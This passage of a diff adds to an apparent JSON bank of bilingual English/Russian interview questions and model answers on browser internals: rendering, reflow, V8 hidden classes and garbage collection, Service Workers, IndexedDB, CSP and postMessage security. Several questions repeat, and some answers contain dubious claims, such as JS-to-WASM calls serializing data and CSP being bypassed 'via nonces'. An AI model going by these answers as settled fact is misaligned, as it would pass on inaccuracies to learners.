+      "ru": "### Оптимизация критического пути рендеринга\n\nКритический путь рендеринга включает парсинг DOM, построение CSSOM, выполнение JavaScript и фазы layout/paint. Узкие места возникают, когда ресурсы, блокирующие рендеринг, останавливают парсинг—оптимизируйте, отложив JS, минифицировав CSS, используя атрибуты async/defer и разделив код.\n\n```typescript\n// Отложите некритический JS, загрузите CSS inline для выше-линии-сгиба\n<script src=\"app.js\" defer></script>\n<link rel=\"preload\" as=\"style\" href=\"critical.css\">\n<script async src=\"analytics.js\"></script>\n// Разделите бандлы, загружая только необходимый код\nimport(\"./heavy-module.js\").then(mod => mod.init());\n```\n\n**Типичная ошибка:** Предположение, что все ресурсы блокируют одинаково—на самом деле async скрипты не блокируют парсинг, только layout."
+    },
+    "tags": [
+      "critical-rendering-path",
+      "performance-optimization",
+      "render-blocking"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-19",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "What is the difference between a reflow and a repaint? Provide an example of code that triggers each and explain when you should batch DOM updates.",
+      "ru": "В чём разница между reflow и repaint? Приведите пример кода, который вызывает каждый, и объясните, когда следует группировать обновления DOM."
+    },
+    "answer": {
+      "en": "### Reflow vs Repaint\n\nRepaint re-renders visual properties (color, shadow) without recalculating layout. Reflow recalculates element dimensions, positions, and affects the entire layout tree—much more expensive. Batch DOM changes using DocumentFragment or CSS classes to minimize reflows.\n\n```typescript\n// BAD: Triggers 3 reflows\nfor (let i = 0; i < 3; i++) {\n  element.style.width = element.offsetWidth + 10 + 'px'; // reads + writes\n}\n\n// GOOD: Batch updates\nconst fragment = document.createDocumentFragment();\nconst clone = element.cloneNode(true);\nclone.style.width = '500px';\nfragment.appendChild(clone);\nelement.parentNode.replaceChild(fragment, element);\n```\n\n**Common interview trap:** Thinking repaint and reflow are the same—repaint is faster since it doesn't affect layout.",
+      "ru": "### Reflow vs Repaint\n\nRepaint перерисовывает визуальные свойства (цвет, тень) без пересчета layout. Reflow пересчитывает размеры элементов, позиции и влияет на всё дерево layout—намного дороже. Группируйте изменения DOM, используя DocumentFragment или CSS классы, чтобы минимизировать reflows.\n\n```typescript\n// ПЛОХО: вызывает 3 reflow\nfor (let i = 0; i < 3; i++) {\n  element.style.width = element.offsetWidth + 10 + 'px'; // читает + пишет\n}\n\n// ХОРОШО: группируйте обновления\nconst fragment = document.createDocumentFragment();\nconst clone = element.cloneNode(true);\nclone.style.width = '500px';\nfragment.appendChild(clone);\nelement.parentNode.replaceChild(fragment, element);\n```\n\n**Типичная ошибка:** Думать, что repaint и reflow—одно и то же—repaint быстрее, так как не влияет на layout."
+    },
+    "tags": [
+      "reflow",
+      "repaint",
+      "dom-optimization",
+      "layout-thrashing"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-20",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "Explain V8's JIT compilation process and how hidden classes enable inline caching. How would you write code that helps the JIT compiler optimize it better?",
+      "ru": "Объясните процесс JIT компиляции V8 и как скрытые классы включают inline кеширование. Как бы вы написали код, чтобы помочь JIT компилятору лучше его оптимизировать?"
+    },
+    "answer": {
+      "en": "### V8 JIT Compilation & Hidden Classes\n\nV8 uses hidden classes (maps) to track object shape and enable inline caching (IC) for fast property access. Each time object shape changes, a new hidden class is created. Monomorphic functions (single type) are optimized better than polymorphic ones—maintain consistent object shapes for JIT optimization.\n\n```typescript\n// GOOD: Consistent shape, single hidden class\nclass Point { constructor(x, y) { this.x = x; this.y = y; } }\nconst p1 = new Point(1, 2);\nconst p2 = new Point(3, 4);\n\n// BAD: Polymorphic function, harder to optimize\nfunction getValue(obj) { return obj.value; } // accessed on many object types\n\n// GOOD: Keep object construction order consistent\nconst obj = {};\nobj.a = 1; obj.b = 2; // same order every time\n```\n\n**Common interview trap:** Assuming dynamic property addition has no cost—it invalidates hidden classes and disables IC optimization.",
+      "ru": "### V8 JIT компиляция и скрытые классы\n\nV8 использует скрытые классы (maps) для отслеживания формы объекта и включения inline кеширования (IC) для быстрого доступа к свойствам. Каждый раз при изменении формы объекта создаётся новый скрытый класс. Мономорфные функции (один тип) оптимизируются лучше, чем полиморфные—сохраняйте одинаковые формы объектов для оптимизации JIT.\n\n```typescript\n// ХОРОШО: Одинаковая форма, один скрытый класс\nclass Point { constructor(x, y) { this.x = x; this.y = y; } }\nconst p1 = new Point(1, 2);\nconst p2 = new Point(3, 4);\n\n// ПЛОХО: Полиморфная функция, сложнее оптимизировать\nfunction getValue(obj) { return obj.value; } // доступ на многих типах\n\n// ХОРОШО: сохраняйте порядок добавления свойств\nconst obj = {};\nobj.a = 1; obj.b = 2; // один порядок всегда\n```\n\n**Типичная ошибка:** Предположение, что динамическое добавление свойств не имеет стоимости—оно инвалидирует скрытые классы и отключает IC оптимизацию."
+    },
+    "tags": [
+      "v8-jit",
+      "hidden-classes",
+      "inline-caching",
+      "performance-profiling"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-21",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "Describe the browser's garbage collection strategy in V8. How do generational GC and the mark-sweep algorithm work? What patterns should you avoid to prevent GC pauses?",
+      "ru": "Опишите стратегию сборки мусора браузера в V8. Как работает поколенческая сборка мусора и алгоритм mark-sweep? Какие паттерны следует избегать, чтобы предотвратить паузы GC?"
+    },
+    "answer": {
+      "en": "### V8 Garbage Collection Strategy\n\nV8 uses generational GC with a young generation (fast scavenging via Cheney algorithm) and old generation (mark-sweep-compact). Most objects die young, so frequent young GC is cheaper than full GC. Avoid creating large object graphs, retaining references unnecessarily, and allocating in hot loops—these trigger full GC pauses.\n\n```typescript\n// BAD: Large retained object graph, frequent allocations\nfunction processData() {\n  const cache = {}; // grows unbounded\n  for (let i = 0; i < 1000000; i++) {\n    cache[i] = new Array(1000).fill(i); // allocates in loop\n  }\n}\n\n// GOOD: Reuse objects, limit scope\nconst buffer = new ArrayBuffer(8192);\nfunction process() {\n  // reuse buffer instead of allocating new arrays\n}\n```\n\n**Common interview trap:** Assuming all GC pauses are equal—young generation pauses are milliseconds, full GC can pause hundreds of milliseconds.",
+      "ru": "### Стратегия сборки мусора V8\n\nV8 использует поколенческую сборку мусора с молодым поколением (быстрое scavenging через алгоритм Cheney) и старым поколением (mark-sweep-compact). Большинство объектов живут недолго, поэтому частая молодая GC дешевле, чем полная GC. Избегайте создания больших графов объектов, ненужного удержания ссылок и выделения памяти в горячих циклах—это вызывает паузы полной GC.\n\n```typescript\n// ПЛОХО: большой удерживаемый граф объектов, частые выделения\nfunction processData() {\n  const cache = {}; // растёт без ограничений\n  for (let i = 0; i < 1000000; i++) {\n    cache[i] = new Array(1000).fill(i); // выделяет память в цикле\n  }\n}\n\n// ХОРОШО: переиспользуйте объекты, ограничьте область видимости\nconst buffer = new ArrayBuffer(8192);\nfunction process() {\n  // переиспользуйте buffer вместо выделения новых массивов\n}\n```\n\n**Типичная ошибка:** Предположение, что все паузы GC равны—молодая GC паузирует на миллисекунды, полная GC может паузировать сотни миллисекунд."
+    },
+    "tags": [
+      "garbage-collection",
+      "memory-management",
+      "v8-internals",
+      "gc-pauses"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-22",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "Walk through the complete browser rendering pipeline (parse → style → layout → paint → composite). What happens at each stage and how would you measure where rendering bottlenecks occur?",
+      "ru": "Пройдитесь по полному конвейеру рендеринга браузера (parse → style → layout → paint → composite). Что происходит на каждом этапе и как бы вы измерили, где возникают узкие места рендеринга?"
+    },
+    "answer": {
+      "en": "### Browser Rendering Pipeline\n\nParsing creates the DOM tree from HTML. Styling applies CSSOM rules to generate the render tree (visible elements only). Layout calculates positions/sizes. Paint rasterizes pixels to layers. Composite combines layers respecting z-order and transforms. Use DevTools Performance tab to identify bottlenecks—long tasks in JS, layout recalculations, or paint operations.\n\n```typescript\n// Measure rendering performance\nconst observer = new PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    console.log(`${entry.name}: ${entry.duration}ms`);\n  }\n});\nobserver.observe({ entryTypes: ['paint', 'largest-contentful-paint'] });\n\n// Force layout to see bottleneck\nelement.offsetHeight; // triggers layout\nelement.style.transform = 'translate(10px)'; // composite only, cheaper\n```\n\n**Common interview trap:** Thinking transform and opacity changes trigger paint—they only trigger composite, which is fastest.",
+      "ru": "### Конвейер рендеринга браузера\n\nПарсинг создаёт дерево DOM из HTML. Стилизация применяет правила CSSOM для генерации дерева рендеринга (только видимые элементы). Layout вычисляет позиции/размеры. Paint растеризирует пиксели в слои. Composite комбинирует слои, учитывая z-порядок и трансформации. Используйте вкладку Performance DevTools для определения узких мест—длительные задачи JS, пересчёты layout или операции paint.\n\n```typescript\n// Измеряйте производит��льность рендеринга\nconst observer = new PerformanceObserver((list) => {\n  for (const entry of list.getEntries()) {\n    console.log(`${entry.name}: ${entry.duration}ms`);\n  }\n});\nobserver.observe({ entryTypes: ['paint', 'largest-contentful-paint'] });\n\n// Принудите layout, чтобы увидеть узкое место\nelement.offsetHeight; // вызывает layout\nelement.style.transform = 'translate(10px)'; // только composite, дешевле\n```\n\n**Типичная ошибка:** Думать, что изменения transform и opacity вызывают paint—они только вызывают composite, что быстрее всего."
+    },
+    "tags": [
+      "rendering-pipeline",
+      "parse-style-layout-paint",
+      "composite",
+      "performance-measurement"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-23",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "Explain the critical rendering path and how you would optimize it. What's the difference between render-blocking and parser-blocking resources?",
+      "ru": "Объясните критический путь рендеринга и как его оптимизировать. В чём разница между render-blocking и parser-blocking ресурсами?"
+    },
+    "answer": {
+      "en": "### Critical Rendering Path\n\nThe critical rendering path consists of Parse → Style → Layout → Paint → Composite. Parser-blocking resources (synchronous scripts) stop DOM parsing, while render-blocking resources (CSS) block rendering until processed. Optimize by deferring non-critical scripts and loading CSS asynchronously.\n\n```typescript\n// Parser-blocking (bad)\n<script src=\"heavy.js\"></script>\n\n// Better alternatives\n<script src=\"heavy.js\" defer></script>\n<link rel=\"stylesheet\" href=\"style.css\">\n<link rel=\"preload\" href=\"critical.css\" as=\"style\">\n```\n\n**Common interview trap:** Thinking all scripts are render-blocking—only synchronous inline scripts and external scripts block parsing.",
+      "ru": "### Критический путь рендеринга\n\nКритический путь состоит из Parse → Style → Layout → Paint → Composite. Parser-blocking ресурсы (синхронные скрипты) останавливают парсинг DOM, а render-blocking ресурсы (CSS) блокируют рендеринг. Оптимизируйте, откладывая некритичные скрипты и загружая CSS асинхронно.\n\n```typescript\n// Parser-blocking (плохо)\n<script src=\"heavy.js\"></script>\n\n// Лучше\n<script src=\"heavy.js\" defer></script>\n<link rel=\"stylesheet\" href=\"style.css\">\n<link rel=\"preload\" href=\"critical.css\" as=\"style\">\n```\n\n**Типичная ошибка:** Думать, что все скрипты блокируют рендеринг—блокируют только синхронные встроенные скрипты и внешние скрипты."
+    },
+    "tags": [
+      "critical-rendering-path",
+      "optimization",
+      "parser-blocking",
+      "render-blocking"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-24",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "What triggers a reflow vs a repaint? Provide examples of CSS properties that cause each and explain how to minimize them in performance-critical code.",
+      "ru": "Что вызывает reflow vs repaint? Приведите примеры CSS свойств для каждого и объясните, как их минимизировать в критичном по производительности коде."
+    },
+    "answer": {
+      "en": "### Reflow vs Repaint\n\nRepaint updates visual styles (color, background) without geometry changes. Reflow recalculates layout (width, height, position) and is more expensive. Batch DOM reads/writes and use transform/opacity (composite layer) to avoid reflows.\n\n```typescript\n// Triggers reflow (bad)\nfor (let i = 0; i < 1000; i++) {\n  element.style.width = (i * 2) + 'px'; // Layout recalc each iteration\n}\n\n// Better: batch and use transform\nfor (let i = 0; i < 1000; i++) {\n  element.style.transform = `scaleX(${i * 0.002})`; // Composite only\n}\n```\n\n**Common interview trap:** Assuming all CSS changes trigger reflow—properties like transform and opacity don't affect layout and only cause repaints/composites.",
+      "ru": "### Reflow vs Repaint\n\nRepaint обновляет визуальные стили (color, background) без изменения геометрии. Reflow пересчитывает макет (width, height, position) и дороже. Группируйте чтения/записи DOM и используйте transform/opacity для избежания reflow.\n\n```typescript\n// Вызывает reflow (плохо)\nfor (let i = 0; i < 1000; i++) {\n  element.style.width = (i * 2) + 'px'; // Пересчёт layout каждую итерацию\n}\n\n// Лучше: используйте transform\nfor (let i = 0; i < 1000; i++) {\n  element.style.transform = `scaleX(${i * 0.002})`; // Только composite\n}\n```\n\n**Типичная ошибка:** Думать, что все CSS изменения вызывают reflow—свойства transform и opacity не влияют на макет."
+    },
+    "tags": [
+      "reflow",
+      "repaint",
+      "composite",
+      "layout-thrashing"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-25",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "Explain V8's hidden classes and inline caches. How do they affect performance and what patterns should you avoid to keep objects in the same hidden class?",
+      "ru": "Объясните скрытые классы V8 и inline caches. Как они влияют на производительность и какие паттерны нужно избегать, чтобы объекты оставались в одном скрытом классе?"
+    },
+    "answer": {
+      "en": "### Hidden Classes and Inline Caches\n\nV8 assigns hidden classes to objects with the same property structure for JIT optimization. Inline caches speed up property lookups by remembering previous access patterns. Avoid adding properties dynamically or changing property order to maintain class stability.\n\n```typescript\n// Bad: shapes different objects\nconst obj1 = { x: 1, y: 2 };\nconst obj2 = { y: 2, x: 1 }; // Different hidden class!\nobj1.z = 3; // obj1 shape changed\n\n// Good: consistent structure\nclass Point { constructor(x, y) { this.x = x; this.y = y; } }\nconst p1 = new Point(1, 2);\nconst p2 = new Point(3, 4); // Same hidden class\n```\n\n**Common interview trap:** Thinking hidden classes only matter for objects—arrays and typed arrays also rely on them for optimization.",
+      "ru": "### Скрытые классы и Inline Caches\n\nV8 присваивает скрытые классы объектам с одинаковой структурой для JIT оптимизации. Inline caches ускоряют поиск свойств, запоминая предыдущие паттерны доступа. Избегайте динамического добавления свойств и изменения порядка свойств.\n\n```typescript\n// Плохо: разные формы объектов\nconst obj1 = { x: 1, y: 2 };\nconst obj2 = { y: 2, x: 1 }; // Разный скрытый класс!\nobj1.z = 3; // Форма obj1 изменилась\n\n// Хорошо: согласованная структура\nclass Point { constructor(x, y) { this.x = x; this.y = y; } }\nconst p1 = new Point(1, 2);\nconst p2 = new Point(3, 4); // Один скрытый класс\n```\n\n**Типичная ошибка:** Думать, что скрытые классы важны только для объектов—массивы и типизированные массивы тоже от них зависят."
+    },
+    "tags": [
+      "V8",
+      "hidden-classes",
+      "inline-caches",
+      "JIT-compilation",
+      "object-shapes"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-26",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "How does V8's garbage collection work and what are the generational GC principles? What performance issues can arise from GC pauses and how do you profile them?",
+      "ru": "Как работает сборка мусора в V8 и каковы принципы поколенческой сборки мусора? Какие проблемы производительности могут возникнуть из-за пауз GC и как их профилировать?"
+    },
+    "answer": {
+      "en": "### V8 Garbage Collection\n\nV8 uses generational GC: young objects are collected frequently (Scavenge), old objects are collected rarely (Mark-Sweep-Compact). GC pauses block main thread, causing jank. Profile with DevTools Timeline/Performance tab to identify long GC pauses and optimize object allocation patterns.\n\n```typescript\n// Creates excessive objects (triggers frequent GC)\nfunction processArray(arr) {\n  return arr.map(x => ({ value: x * 2 })); // New object per item\n}\n\n// Better: reuse or pre-allocate\nconst result = new Array(arr.length);\nfor (let i = 0; i < arr.length; i++) {\n  result[i] = arr[i] * 2; // No intermediate objects\n}\n```\n\n**Common interview trap:** Assuming GC is always bad—young generation collections are fast; focus on reducing object churn, not eliminating allocation.",
+      "ru": "### Сборка мусора V8\n\nV8 использует поколенческую сборку: молодые объекты собираются часто (Scavenge), старые собираются редко (Mark-Sweep-Compact). Паузы GC блокируют главный поток, вызывая jank. Профилируйте с помощью DevTools Timeline для выявления долгих пауз.\n\n```typescript\n// Создаёт много объектов (частые GC)\nfunction processArray(arr) {\n  return arr.map(x => ({ value: x * 2 })); // Новый объект за итерацию\n}\n\n// Лучше: переиспользуйте\nconst result = new Array(arr.length);\nfor (let i = 0; i < arr.length; i++) {\n  result[i] = arr[i] * 2; // Нет промежуточных объектов\n}\n```\n\n**Типичная ошибка:** Думать, что сборка мусора всегда плохая—молодое поколение собирается быстро, фокусируйтесь на снижении частоты создания объектов."
+    },
+    "tags": [
+      "garbage-collection",
+      "generational-GC",
+      "memory-management",
+      "GC-pauses",
+      "profiling"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-27",
+    "topicId": "browser-runtime",
+    "difficulty": "senior",
+    "question": {
+      "en": "Walk through the complete browser rendering pipeline from HTML parsing to pixel display. At what points can JavaScript intervention slow down rendering?",
+      "ru": "Пройдите через полный конвейер рендеринга браузера от парсинга HTML до отображения пикселей. В каких точках вмешательство JavaScript может замедлить рендеринг?"
+    },
+    "answer": {
+      "en": "### Browser Rendering Pipeline\n\nPipeline: Parse HTML → Construct DOM → CSSOM → Render Tree → Layout → Paint → Composite. JavaScript can block parsing (sync scripts), defer style recalculation, force reflows, and block compositing. Use requestAnimationFrame and Web Workers to minimize main thread blocking.\n\n```typescript\n// Blocks parsing and layout\n<script>\n  document.body.style.width = '100%'; // Triggers CSSOM wait + reflow\n</script>\n\n// Better: defer heavy work\nrequestAnimationFrame(() => {\n  document.body.style.width = '100%'; // Batches with next frame\n});\n```\n\n**Common interview trap:** Thinking JavaScript only affects parsing—it also blocks style recalculation, layout, and composite if it's synchronous and long-running on main thread.",
+      "ru": "### Конвейер рендеринга браузера\n\nПипeline: Parse HTML → Construct DOM → CSSOM → Render Tree → Layout → Paint → Composite. JavaScript блокирует парсинг (синхронные скрипты), задерживает пересчёт стилей и вызывает reflow. Используйте requestAnimationFrame и Web Workers для минимизации блокировки.\n\n```typescript\n// Блокирует парсинг и layout\n<script>\n  document.body.style.width = '100%'; // Ожидает CSSOM + reflow\n</script>\n\n// Лучше: отложите тяжёлую работу\nrequestAnimationFrame(() => {\n  document.body.style.width = '100%'; // Группирует со следующим фреймом\n});\n```\n\n**Типичная ошибка:** Думать, что JavaScript влияет только на парсинг—оно также блокирует пересчёт стилей, layout и composite, если оно синхронное и долгоживущее."
+    },
+    "tags": [
+      "rendering-pipeline",
+      "parse-stage",
+      "style-stage",
+      "layout-stage",
+      "paint-stage",
+      "composite-stage",
+      "main-thread"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-28",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "Explain how SharedArrayBuffer and Atomics work together to enable safe concurrent access in Web Workers. What are the key differences between Atomics.load/store and regular property access?",
+      "ru": "Объясните, как SharedArrayBuffer и Atomics работают вместе для безопасного одновременного доступа в Web Workers. В чём ключевые различия между Atomics.load/store и обычным доступом к свойствам?"
+    },
+    "answer": {
+      "en": "### SharedArrayBuffer & Atomics for Thread-Safe Operations\n\nSharedArrayBuffer allows multiple workers to access the same memory block, while Atomics provides atomic operations that prevent race conditions. Regular property access can be interrupted mid-operation; Atomics ensures operations complete without interruption.\n\n```typescript\nconst shared = new SharedArrayBuffer(4);\nconst view = new Int32Array(shared);\n\n// Safe increment across workers\nAtomics.store(view, 0, 5);\nconst value = Atomics.load(view, 0);\nAtomics.add(view, 0, 1); // Atomic addition\n\nAtomics.wait(view, 0, 6); // Block until value changes\n```\n\n**Common interview trap:** Assuming SharedArrayBuffer is always safe—Atomics operations are required; regular reads/writes still have race conditions.",
+      "ru": "### SharedArrayBuffer и Atomics для безопасных операций\n\nSharedArrayBuffer позволяет нескольким workers получать доступ к одному блоку памяти, а Atomics предоставляет атомарные операции, которые предотвращают race conditions. Обычный доступ может быть прерван; Atomics гарантирует завершение без прерываний.\n\n```typescript\nconst shared = new SharedArrayBuffer(4);\nconst view = new Int32Array(shared);\n\n// Безопасное увеличение значения\nAtomics.store(view, 0, 5);\nconst value = Atomics.load(view, 0);\nAtomics.add(view, 0, 1); // Атомарное добавление\n\nAtomics.wait(view, 0, 6); // Ждём изменения значения\n```\n\n**Типичная ошибка:** Предположение, что SharedArrayBuffer всегда безопасен—требуются операции Atomics; обычные чтения/записи имеют race conditions."
+    },
+    "tags": [
+      "shared-array-buffer",
+      "atomics",
+      "concurrency",
+      "web-workers"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-29",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "How does WebAssembly integrate with the JavaScript event loop and garbage collection? What are the performance implications of frequent JS-to-WASM boundary crossings?",
+      "ru": "Как WebAssembly интегрируется с event loop JavaScript и сборкой мусора? Какие последствия для производительности имеют частые переходы через границу JS-WASM?"
+    },
+    "answer": {
+      "en": "### WebAssembly Integration with JS Runtime\n\nWebAssembly runs synchronously on the same event loop thread but with its own linear memory and execution context. Each JS-to-WASM call involves serializing data and copying across the boundary, which becomes expensive with frequent small calls; batching operations reduces overhead.\n\n```typescript\n// Inefficient: many small boundary crossings\nfor (let i = 0; i < 1000; i++) {\n  wasmModule.process(data[i]); // Boundary cross per iteration\n}\n\n// Efficient: batch data into WASM\nconst buffer = new Float32Array(data);\nwasmModule.processBatch(buffer.byteOffset, data.length);\n```\n\n**Common interview trap:** Thinking WASM runs on a separate thread—it blocks the event loop like synchronous JS; parallelism requires Workers.",
+      "ru": "### Интеграция WebAssembly с JS runtime\n\nWebAssembly выполняется синхронно в одном потоке event loop, но с собственной линейной памятью и контекстом исполнения. Каждый вызов JS-to-WASM включает сериализацию данных и копирование через границу, что становится дорогим при частых малых вызовах; группировка операций снижает overhead.\n\n```typescript\n// Неэффективно: много малых переходов границы\nfor (let i = 0; i < 1000; i++) {\n  wasmModule.process(data[i]); // Переход границы на итерацию\n}\n\n// Эффективно: передать данные в WASM батчем\nconst buffer = new Float32Array(data);\nwasmModule.processBatch(buffer.byteOffset, data.length);\n```\n\n**Типичная ошибка:** Думать, что WASM работает в отдельном потоке—он блокирует event loop как синхронный JS; параллелизм требует Workers."
+    },
+    "tags": [
+      "webassembly",
+      "event-loop",
+      "performance",
+      "js-wasm-boundary"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-30",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "Walk through the complete Service Worker lifecycle from registration to skipWaiting. How does the lifecycle impact cache versioning and zero-downtime deployments?",
+      "ru": "Опишите полный жизненный цикл Service Worker от регистрации до skipWaiting. Как этот цикл влияет на версионирование кеша и развёртывание без простоев?"
+    },
+    "answer": {
+      "en": "### Service Worker Lifecycle & Cache Management\n\nService Workers progress: parsing → installing → waiting → activating → controlled. New versions remain in waiting state until old clients disconnect; skipWaiting forces activation immediately, risking incompatibility. Cache versioning should use content hashes or timestamps to prevent stale assets during multi-version overlap.\n\n```typescript\nself.addEventListener('install', (e) => {\n  e.waitUntil(caches.open('v2').then(cache => cache.addAll([...])));\n});\n\nself.addEventListener('activate', (e) => {\n  e.waitUntil(caches.keys().then(names => \n    Promise.all(names.filter(n => n !== 'v2').map(n => caches.delete(n)))\n  ));\n});\n\nself.skipWaiting(); // Forces activation—use with caution\n```\n\n**Common interview trap:** Assuming skipWaiting is safe—old pages may still expect old API contracts; always handle version mismatch gracefully.",
+      "ru": "### Жизненный цикл Service Worker и управление кешем\n\nService Workers прогрессируют: parsing → installing → waiting → activating → controlled. Новые версии остаются в ожидании, пока старые клиенты не отключатся; skipWaiting принудительно активирует, рискуя несовместимостью. Версионирование кеша должно использовать хеши контента или временные метки, чтобы избежать устаревших ассетов при перекрытии версий.\n\n```typescript\nself.addEventListener('install', (e) => {\n  e.waitUntil(caches.open('v2').then(cache => cache.addAll([...])));\n});\n\nself.addEventListener('activate', (e) => {\n  e.waitUntil(caches.keys().then(names => \n    Promise.all(names.filter(n => n !== 'v2').map(n => caches.delete(n)))\n  ));\n});\n\nself.skipWaiting(); // Принудительная активация—используй осторожно\n```\n\n**Типичная ошибка:** Предположение, что skipWaiting безопасен—старые страницы могут ожидать старых контрактов API; всегда обрабатывай несовместимость версий."
+    },
+    "tags": [
+      "service-worker",
+      "lifecycle",
+      "caching",
+      "deployment"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-31",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "Design an IndexedDB pattern for storing large datasets with efficient cursor-based pagination. How would you handle concurrent writes from multiple tabs and ensure consistency?",
+      "ru": "Спроектируйте паттерн IndexedDB для хранения больших наборов данных с эффективной пагинацией на основе курсоров. Как обработать одновременные записи из нескольких вкладок и обеспечить консистентность?"
+    },
+    "answer": {
+      "en": "### IndexedDB Pagination & Concurrency\n\nUse cursor-based pagination with index ranges to avoid counting all records. Multiple tabs can write simultaneously due to IDB's locking per transaction, but use versioned updates (e.g., storing timestamp/version field) to detect concurrent modifications. Listen to 'versionchange' events to detect schema updates from other tabs.\n\n```typescript\nconst tx = db.transaction('items', 'readonly');\nconst index = tx.objectStore('items').index('timestamp');\nconst range = IDBKeyRange.lowerBound(lastId);\nlet count = 0;\n\nindex.openCursor(range).onsuccess = (e) => {\n  const cursor = e.target.result;\n  if (cursor && count < 20) { // Fetch 20 items\n    processItem(cursor.value);\n    count++;\n    cursor.continue();\n  }\n};\n\ndb.onversionchange = () => location.reload(); // Sync schema changes\n```\n\n**Common interview trap:** Thinking IDB prevents concurrent writes—it allows parallel writes across tabs; your app must handle version conflicts.",
+      "ru": "### IndexedDB пагинация и конкурентность\n\nИспользуй пагинацию на основе курсоров с диапазонами индексов, чтобы избежать подсчёта всех записей. Несколько вкладок могут писать одновременно благодаря блокировке IDB per transaction, но используй версионированные обновления (timestamp/version поле) для обнаружения конкурентных изменений. Слушай события 'versionchange' для синхронизации изменений схемы.\n\n```typescript\nconst tx = db.transaction('items', 'readonly');\nconst index = tx.objectStore('items').index('timestamp');\nconst range = IDBKeyRange.lowerBound(lastId);\nlet count = 0;\n\nindex.openCursor(range).onsuccess = (e) => {\n  const cursor = e.target.result;\n  if (cursor && count < 20) { // Загрузи 20 предметов\n    processItem(cursor.value);\n    count++;\n    cursor.continue();\n  }\n};\n\ndb.onversionchange = () => location.reload(); // Синхронизация схемы\n```\n\n**Типичная ошибка:** Думать, что IDB предотвращает одновременные записи—он позволяет параллельные записи между вкладками; твоё приложение должно обрабатывать конфликты версий."
+    },
+    "tags": [
+      "indexeddb",
+      "pagination",
+      "cursor",
+      "concurrent-writes"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-32",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "Explain the browser security model: same-origin policy, postMessage security, and how CSP prevents XSS. What are the limitations of CSP against sophisticated attacks?",
+      "ru": "Объясните модель безопасности браузера: политика same-origin, безопасность postMessage и как CSP предотвращает XSS. Каковы ограничения CSP против сложных атак?"
+    },
+    "answer": {
+      "en": "### Browser Security Model: SOP, postMessage, CSP\n\nSame-Origin Policy isolates documents by protocol/domain/port to prevent script injection. postMessage requires explicit origin validation to prevent leaking data to malicious iframes. CSP restricts script execution sources and inline scripts but can be bypassed via nonces, unsafe-eval, or unsafe-inline; it doesn't protect against logic flaws or CSRF without additional headers like SameSite.\n\n```typescript\n// postMessage security: validate origin\nwindow.addEventListener('message', (e) => {\n  if (e.origin !== 'https://trusted.com') return; // Crucial!\n  processData(e.data);\n});\n\n// CSP header: restrict sources\n// Content-Security-Policy: script-src 'self' 'nonce-abc123'; object-src 'none';\n\n// Nonce-based inline scripts (CSP3)\n<script nonce=\"abc123\">console.log('allowed');</script>\n```\n\n**Common interview trap:** Believing CSP alone stops XSS—nonces/hashes must be cryptographically random; unsafe-inline defeats the purpose, and DOM-based XSS requires sanitization.",
+      "ru": "### Модель безопасности браузера: SOP, postMessage, CSP\n\nSame-Origin Policy изолирует документы по протоколу/домену/порту для предотвращения инъекций скриптов. postMessage требует явной валидации origin для предотвращения утечки данных в вредоносные iframes. CSP ограничивает источники выполнения скриптов и встроенные скрипты, но может быть обойдена через nonces, unsafe-eval или unsafe-inline; она не защищает от логических ошибок или CSRF без дополнительных заголовков вроде SameSite.\n\n```typescript\n// postMessage security: валидация origin\nwindow.addEventListener('message', (e) => {\n  if (e.origin !== 'https://trusted.com') return; // Критично!\n  processData(e.data);\n});\n\n// CSP header: ограничь источники\n// Content-Security-Policy: script-src 'self' 'nonce-abc123'; object-src 'none';\n\n// Inline скрипты с nonce (CSP3)\n<script nonce=\"abc123\">console.log('разрешено');</script>\n```\n\n**Типичная ошибка:** Вера в то, что CSP одна останавливает XSS—nonces/hashes должны быть криптографически случайными; unsafe-inline нарушает цель, DOM-based XSS требует санитизации."
+    },
+    "tags": [
+      "same-origin-policy",
+      "csp",
+      "security",
+      "xss-prevention"
+    ]
+  },
+  {
+    "id": "browser-runtime-q-33",
+    "topicId": "browser-runtime",
+    "difficulty": "advanced",
+    "question": {
+      "en": "Explain how SharedArrayBuffer and Atomics enable safe concurrent access in Web Workers. What are the security implications and when would you use Atomics.wait() vs spin-loop patterns?",
+      "ru": "Объясните, как SharedArrayBuffer и Atomics обеспечивают безопасный одновременный доступ в Web Workers. Каковы последствия для безопасности и когда использовать Atomics.wait() вместо spin-loop паттернов?"
+    },
+    "answer": {
